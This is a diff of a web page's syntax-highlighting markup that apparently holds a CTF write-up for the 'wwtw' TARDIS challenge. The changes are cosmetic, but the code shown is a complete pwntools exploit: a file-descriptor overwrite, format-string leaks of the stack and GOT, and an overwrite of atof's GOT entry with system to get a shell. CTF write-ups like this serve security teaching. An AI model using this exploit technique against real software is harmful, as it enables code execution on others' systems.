@@ -462,21 +462,21 @@ Selection:
 </ol>
 
 <p>Here’s the payload:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># overwrite fd into stdin
-</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># wait for 2 second (until the service call sub_BCB())
-</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># m+YU = 1431907181
-</span><span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>    <span class="c1"># turn on the TARDIS console
-</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># write the fd back
-</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># overwrite fd into stdin
+</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># wait for 2 second (until the service call sub_BCB())
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># m+YU = 1431907181
+</span><span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>    <span class="c1"># turn on the TARDIS console
+</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># write the fd back
+</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>
 </code></pre></div></div>
 
 <p>After we successfully enable option 3, let’s see what does it do:</p>
@@ -551,7 +551,7 @@ Selection:
 	<span class="n">MAP</span><span class="o">=</span><span class="n">MAP</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">MAP</span><span class="p">)</span><span class="o">-</span><span class="mi">24</span><span class="p">]</span>
 	<span class="k">print</span> <span class="n">MAP</span>
 	<span class="n">MAP</span><span class="o">=</span><span class="n">MAP</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">MAP</span><span class="p">)</span><span class="o">-</span><span class="mi">479</span><span class="p">:]</span>
-	<span class="n">sql</span><span class="o">=</span><span class="n">MAP</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+	<span class="n">sql</span><span class="o">=</span><span class="n">MAP</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 	<span class="n">i</span><span class="o">=</span><span class="mi">0</span>
 	<span class="n">res</span> <span class="o">=</span> <span class="p">[[]</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">)]</span> 
 	<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">sql</span><span class="p">:</span>
@@ -578,7 +578,7 @@ Selection:
 
 <span class="c1"># start playing the game
 </span><span class="k">for</span> <span class="n">test</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
-	<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
+	<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
 	<span class="k">if</span> <span class="s">"KEY"</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
 		<span class="k">print</span> <span class="n">s</span>
 		<span class="k">break</span>
@@ -616,27 +616,27 @@ Selection:
 				<span class="n">drct</span><span class="o">+=</span><span class="s">'s'</span>
 			
 	<span class="k">print</span> <span class="n">drct</span>
-	<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">drct</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+	<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">drct</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 
 <span class="c1"># Done playing, time to send TARDIS KEY
 </span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending tardis key..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"UeSlhCAGEp</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># wait for 2 second so the service's able to call sub_BCB()
-</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># m+YU = 1431907181
-</span><span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># turn on the TARDIS console
-</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># write the fd back to 3 so the rest of our input won't get into sub_BCB()
-</span><span class="k">print</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending tardis key..."</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"UeSlhCAGEp</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting fd..."</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x00\n</span><span class="s">"</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># wait for 2 second so the service's able to call sub_BCB()
+</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"enable choice 3..."</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"m+YU</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># m+YU = 1431907181
+</span><span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># turn on the TARDIS console
+</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"writing fd back..."</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"11111111</span><span class="se">\x03\n</span><span class="s">"</span><span class="p">)</span> <span class="c1"># write the fd back to 3 so the rest of our input won't get into sub_BCB()
+</span><span class="k">print</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Selection: "</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"choice 3 enabled success"</span><span class="p">)</span>
 
 <span class="n">x</span> <span class="o">=</span> <span class="mf">51.492137</span>
 <span class="n">y</span> <span class="o">=</span> <span class="o">-</span><span class="mf">0.192878</span>
@@ -646,47 +646,47 @@ Selection:
 
 <span class="c1"># constructing format string payload
 </span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
-    <span class="n">a</span> <span class="o">=</span> <span class="s">".</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">"$p"</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="s">".%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">"$p"</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">a</span>
 
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload..."</span><span class="p">)</span>
-<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload..."</span><span class="p">)</span>
+<span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">s</span>
-<span class="n">nptr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">13</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># get the stack address
+<span class="n">nptr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">13</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># get the stack address
 </span><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">nptr</span> <span class="o">+</span> <span class="mh">0x406</span> <span class="c1"># return address' location
 </span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"nptr: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">nptr</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"ret: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"nptr: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">nptr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"ret: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span> <span class="c1"># padding
 </span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$p"</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$s."</span> <span class="c1"># leak the return address
-</span><span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">".%20$p"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">".%20$s."</span> <span class="c1"># leak the return address
+</span><span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">s</span>
-<span class="n">WTF</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">])</span> <span class="c1"># return address
+<span class="n">WTF</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">])</span> <span class="c1"># return address
 </span><span class="n">text_base</span> <span class="o">=</span> <span class="n">WTF</span> <span class="o">-</span> <span class="mh">0x1491</span>
 <span class="n">atof_got</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x5080</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atof_got: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atof_got</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atof_got: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atof_got</span><span class="p">))</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">pass_xy</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$p"</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">".</span><span class="si">%20</span><span class="s">$s."</span>  <span class="c1"># leak atof's got
-</span><span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">".%20$p"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">".%20$s."</span>  <span class="c1"># leak atof's got
+</span><span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">s</span>
-<span class="n">atof_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
+<span class="n">atof_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)[</span><span class="mi">6</span><span class="p">][</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="n">atof_addr</span> <span class="o">+</span> <span class="mi">59728</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atof addres: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atof_addr</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system addres: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"atof addres: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atof_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system addres: "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
 
 <span class="n">byte1</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
 <span class="n">byte2</span> <span class="o">=</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFF00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
@@ -698,13 +698,13 @@ Selection:
 <span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">atof_got</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">fmt1</span><span class="p">)</span><span class="o">+</span><span class="s">"c"</span><span class="o">+</span><span class="s">"</span><span class="si">%20</span><span class="s">$hhn"</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%</span><span class="s">"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">fmt2</span><span class="p">)</span><span class="o">+</span><span class="s">"c</span><span class="si">%21</span><span class="s">$hn"</span>
-<span class="n">t</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">fmt1</span><span class="p">)</span><span class="o">+</span><span class="s">"c"</span><span class="o">+</span><span class="s">"%20$hhn"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">fmt2</span><span class="p">)</span><span class="o">+</span><span class="s">"c%21$hn"</span>
+<span class="n">t</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Coordinates: "</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">s</span>
 
-<span class="n">t</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">t</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># send cat /home/wwtw/flag;,123 to get flag
 </span>
 </code></pre></div></div>
